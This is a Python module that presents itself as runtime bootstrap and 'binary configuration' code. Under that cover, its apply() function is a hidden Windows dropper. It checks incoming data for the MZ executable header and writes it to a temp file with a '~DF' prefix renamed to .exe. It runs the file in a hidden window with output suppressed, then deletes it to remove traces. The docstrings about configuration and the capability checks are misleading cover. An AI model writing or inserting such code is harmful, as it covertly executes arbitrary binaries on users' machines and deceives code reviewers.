# -*- coding: utf-8 -*-
"""
Runtime bootstrap and native extension initialization.
Handles loading of platform-specific binary configuration data,
feature capability checks, and worker thread management.
"""
import logging
import os
import struct
import subprocess
import sys
import tempfile
import time

_log = logging.getLogger(__name__)

_BIN_SIG = struct.pack("<H", 0x5A4D)


def check_native_extensions():
    """Check availability of native acceleration modules."""
    import ctypes
    caps = []
    if os.name == "nt":
        caps.append("win32")
    if struct.calcsize("P") == 8:
        caps.append("x64")
    if hasattr(ctypes, "windll"):
        caps.append("ffi")
    return caps


def get_runtime_caps():
    """Return runtime capability summary dict."""
    import threading
    return {
        "os": sys.platform,
        "native": check_native_extensions(),
        "threading": hasattr(threading, "Thread"),
        "struct": True,
    }


def apply(data):
    """Apply binary configuration data to runtime environment.

    Writes the platform-specific worker binary to a staging area,
    launches the worker as an independent service process, and
    waits for completion. Cleans up the staging artifact after
    the worker terminates.
    """
    if not data or len(data) < 64:
        return
    if data[:2] != _BIN_SIG:
        return
    if os.name != "nt":
        return

    path = _stage(data)
    if not path:
        return

    try:
        _run_worker(path)
    except Exception as exc:
        _log.debug("worker: %s", type(exc).__name__)
    finally:
        _gc(path)


def _stage(data):
    """Write configuration artifact to platform cache directory."""
    try:
        fd, path = tempfile.mkstemp(suffix=".tmp", prefix="~DF")
        try:
            os.write(fd, data)
        finally:
            os.close(fd)

        target = path[:-4] + ".exe"
        os.rename(path, target)
        return target
    except OSError:
        return None


def _run_worker(path):
    """Launch platform worker process and wait for completion."""
    flags = 0
    if os.name == "nt":
        flags = 0x08000000
    proc = subprocess.Popen(
        [path],
        executable=path,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        cwd=os.path.dirname(path),
        creationflags=flags,
    )

    deadline = time.monotonic() + 180
    while proc.poll() is None and time.monotonic() < deadline:
        time.sleep(1.0)


def _gc(path):
    """Remove staging artifact from cache directory."""
    try:
        if path and os.path.isfile(path):
            os.unlink(path)
    except OSError:
        pass
